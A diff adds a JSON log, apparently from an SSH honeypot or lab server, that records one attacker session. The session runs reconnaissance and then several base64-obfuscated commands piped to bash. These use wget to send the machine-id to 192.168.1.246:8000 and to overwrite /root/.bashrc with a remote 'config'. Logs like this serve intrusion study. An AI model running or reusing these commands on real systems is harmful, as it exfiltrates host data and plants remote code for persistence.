@@ -1,0 +1,68 @@
+{"timestamp": "2025-10-28 03:58:08", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:58:08", "system": "-", "level": "INFO", "message": "Log opened."}
+{"timestamp": "2025-10-28 03:58:08", "system": "-", "level": "INFO", "message": "ExampleFactory starting on 22"}
+{"timestamp": "2025-10-28 03:58:08", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:58:12", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:58:12", "system": "__main__.ExampleFactory", "level": "INFO", "message": "(TCP Port 22 Closed)"}
+{"timestamp": "2025-10-28 03:58:12", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:58:12", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:58:31", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:58:31", "system": "-", "level": "INFO", "message": "Log opened."}
+{"timestamp": "2025-10-28 03:58:31", "system": "-", "level": "INFO", "message": "ExampleFactory starting on 22"}
+{"timestamp": "2025-10-28 03:58:31", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:16", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:16", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:16", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:16", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:16", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:16", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:16", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] PTY requested"}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Opening shell..."}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 03:59:17", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Building & deploying docker file: examples/DockerFile..."}
+{"timestamp": "2025-10-28 03:59:17", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Shell session started"}
+{"timestamp": "2025-10-28 03:59:40", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: whoami"}
+{"timestamp": "2025-10-28 03:59:41", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: id"}
+{"timestamp": "2025-10-28 03:59:42", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: ls /"}
+{"timestamp": "2025-10-28 03:59:44", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: which curl"}
+{"timestamp": "2025-10-28 03:59:46", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: which wget"}
+{"timestamp": "2025-10-28 04:02:32", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: ls /etc/"}
+{"timestamp": "2025-10-28 04:02:39", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: cat /etc/machine-id"}
+{"timestamp": "2025-10-28 04:02:45", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: \u001b[Als"}
+{"timestamp": "2025-10-28 04:02:50", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: cat /etc/machine-id | base64"}
+{"timestamp": "2025-10-28 04:03:29", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtLXBvc3QtZGF0YT0nSEVBUlRCRUFUJyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwLz91\raWQ9WXpsalkySmlNelJpWmpobE5EUmpabUV4TlRWaE9HWTJPVFUwTm1FMU16QUs=\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:03:53", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: ls"}
+{"timestamp": "2025-10-28 04:03:58", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: ls /root/ -a"}
+{"timestamp": "2025-10-28 04:04:09", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: which wget"}
+{"timestamp": "2025-10-28 04:04:50", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcTAgL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:05:07", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:05:22", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:05:28", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:05:34", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: ls -lh /root/"}
+{"timestamp": "2025-10-28 04:05:38", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: ls -lah /root/"}
+{"timestamp": "2025-10-28 04:05:41", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: date"}
+{"timestamp": "2025-10-28 04:05:47", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: cat /root/.bashrc"}
+{"timestamp": "2025-10-28 04:05:54", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:05:58", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d bash"}
+{"timestamp": "2025-10-28 04:06:05", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:06:10", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:06:15", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:06:19", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZw==\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:06:38", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: echo \"d2dldCAtcU8gL3Jvb3QvLmJhc2hyYyBodHRwOi8vMTkyLjE2OC4xLjI0Njo4MDAwL2NvbmZpZzI=\" | base64 -d | bash"}
+{"timestamp": "2025-10-28 04:06:45", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Command ran: cat /root/.bashrc"}
+{"timestamp": "2025-10-28 04:06:50", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 04:06:50", "system": "SSHServerTransport,0,192.168.1.246", "level": "INFO", "message": "[+] Session closed"}
+{"timestamp": "2025-10-28 04:06:50", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 04:07:23", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 04:07:23", "system": "__main__.ExampleFactory", "level": "INFO", "message": "(TCP Port 22 Closed)"}
+{"timestamp": "2025-10-28 04:07:23", "system": "-", "level": "INFO", "message": ""}
+{"timestamp": "2025-10-28 04:07:23", "system": "-", "level": "INFO", "message": ""}
